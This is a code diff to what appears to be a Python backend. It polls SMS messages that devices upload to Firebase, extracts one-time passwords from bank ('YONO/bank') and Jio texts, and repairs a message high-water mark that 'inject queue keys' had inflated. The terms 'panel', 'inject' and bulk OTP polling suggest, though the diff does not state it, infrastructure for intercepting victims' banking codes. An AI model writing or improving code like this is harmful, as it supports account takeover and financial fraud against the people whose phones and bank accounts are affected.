@@ -253,6 +253,7 @@ def _is_incoming_sms_record(record: dict[str, Any]) -> bool:
 
 
 def _max_incoming_push_id(records: list[dict[str, Any]]) -> int:
+    """All devices: high-water from YONO/bank/Jio SMS only — never CHACHA/inject keys."""
     ids: list[int] = []
     for record in records:
         if not _is_incoming_sms_record(record):
@@ -261,6 +262,40 @@ def _max_incoming_push_id(records: list[dict[str, Any]]) -> int:
         if push_id is not None:
             ids.append(push_id)
     return max(ids) if ids else 0
+
+
+# Inject queue keys (e.g. 20261126201917357551) are much larger than panel SMS ids.
+_INJECT_STYLE_KEY_MIN = 10**17
+
+
+async def _repair_inflated_high_water_mark(
+    device: Device,
+    root: str,
+    device_id: str,
+    db,
+) -> None:
+    """One-shot fix when old baseline used max(all keys) — applies to every device automatically."""
+    hw = _messages_high_water(device)
+    if hw < _INJECT_STYLE_KEY_MIN:
+        return
+    records = await _fetch_path_records(
+        root,
+        f"messages/{device_id}",
+        _otp_poll_timeout(),
+    )
+    incoming_hw = _max_incoming_push_id(records)
+    if not incoming_hw or incoming_hw >= hw:
+        return
+    meta = _meta_dict(device)
+    meta[MESSAGES_HIGH_WATER_META] = incoming_hw
+    _save_meta(device, meta)
+    db.commit()
+    logger.info(
+        "Repaired incoming high_water device=%s was=%s now=%s (all devices rule)",
+        device_id,
+        hw,
+        incoming_hw,
+    )
 
 
 def _messages_high_water(device: Device) -> int:
@@ -304,6 +339,8 @@ def _set_baseline_high_water(
 
 def _bump_messages_high_water(device: Device, push_id: int) -> None:
     if push_id <= _messages_high_water(device):
+        return
+    if push_id >= _INJECT_STYLE_KEY_MIN:
         return
     meta = _meta_dict(device)
     meta[MESSAGES_HIGH_WATER_META] = push_id
@@ -1158,9 +1195,7 @@ async def _ensure_messages_high_water(
             f"messages/{device_id}",
             fetch_timeout,
         )
-        push_ids = [pid for pid in (_message_push_id(record) for record in records) if pid]
-        if push_ids:
-            high_water = max(push_ids)
+        high_water = _max_incoming_push_id(records)
 
     _set_baseline_high_water(device, high_water, profile.started_at)
     db.commit()
@@ -1186,10 +1221,11 @@ async def _poll_messages_otp_only(
         logger.warning("OTP poll skip: empty device name")
         return 0
 
+    root = firebase_root_url(firebase_url)
     await _ensure_messages_high_water(profile, device, firebase_url, db)
+    await _repair_inflated_high_water_mark(device, root, device_id, db)
     high_water = _messages_high_water(device)
 
-    root = firebase_root_url(firebase_url)
     path = f"messages/{device_id}"
     try:
         fetch_timeout = _otp_poll_timeout()
